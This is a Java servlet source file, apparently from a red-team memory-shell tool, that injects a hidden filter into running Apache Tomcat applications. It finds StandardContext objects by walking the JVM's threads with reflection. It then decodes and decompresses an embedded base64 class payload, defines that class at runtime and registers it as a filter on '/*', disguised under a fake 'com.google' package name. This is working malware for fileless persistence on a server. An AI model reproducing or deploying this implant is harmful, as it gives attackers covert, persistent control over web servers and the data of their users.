import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public class TestServlet extends HttpServlet {

    static Object getFV(Object obj, String fieldName) throws Exception {
        try {
            Field field = getF(obj, fieldName);
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception var3) {
            return null;
        }
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        for (Class<?> clazz = obj.getClass(); clazz != null; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var3) {
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getF(obj, fieldName);
        field.set(obj, value);
    }

    static byte[] decodeBase64(String base64Str) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception var4) {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream gzipInputStream = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while ((n = gzipInputStream.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;

        Class<?> tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (Method value : methods) {
                        if (value.getName().equals(methodName) && value.getParameterTypes().length == 0) {
                            method = value;
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "com.google.gso.sLUOL.ErrorHandler";
    }

    public String getBase64String() {
        return "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";
    }

    public void addListener(Object context, Object listener) throws Exception {
        if (!this.isInjected(context, this.getClassName())) {
            String filedName = "applicationEventListenersObjects";
            Object applicationEventListenersObjects = getFV(context, filedName);
            if (applicationEventListenersObjects == null) {
                filedName = "applicationEventListenersInstances";
                applicationEventListenersObjects = getFV(context, filedName);
            }
            if (applicationEventListenersObjects != null) {
                Object[] appListeners = (Object[]) applicationEventListenersObjects;
                if (appListeners != null) {
                    List appListenerList = new ArrayList(Arrays.asList(appListeners));
                    appListenerList.add(listener);
                    setFieldValue(context, filedName, appListenerList.toArray());
                }
            } else if (getFV(context, "applicationEventListenersList") != null) {
                List<Object> appListeners = (List) getFV(context, "applicationEventListenersList");
                if (appListeners != null) {
                    appListeners.add(listener);
                }
            }
        }
    }

    public boolean isInjected(Object context, String evilClassName) throws Exception {
        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
        List listeners = Arrays.asList(objects);

        for (Object o : new ArrayList(listeners)) {
            if (o.getClass().getName().contains(evilClassName)) {
                return true;
            }
        }

        return false;
    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");

        try {
            for (Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map) this.getFieldValue(this.getFieldValue(this.getFieldValue(thread, "target"), "this$0"), "children");

                    for (Object key : childrenMap.keySet()) {
                        Map<?, ?> children = (Map) this.getFieldValue(childrenMap.get(key), "children");

                        for (Object key1 : children.keySet()) {
                            Object context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                }
            }

            return contexts;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable e1) {
                e1.printStackTrace();
            }
        }

        return filter;
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        String filterClassName = this.getClassName();

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterClassName}) != null) {
                return;
            }
        } catch (Exception var10) {
        }

        Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
        Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
            Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var9) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);

            try {
                Object filterConfig = constructors[0].newInstance(context, filterDef);
                Map filterConfigs = (Map) this.getFieldValue(context, "filterConfigs");
                filterConfigs.put(filterClassName, filterConfig);
            } catch (Exception e) {
                if (!(e.getCause() instanceof ClassNotFoundException)) {
                    throw e;
                }
            }
        } catch (Exception var12) {
        }

    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

    }

    @SuppressWarnings("all")
    public Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
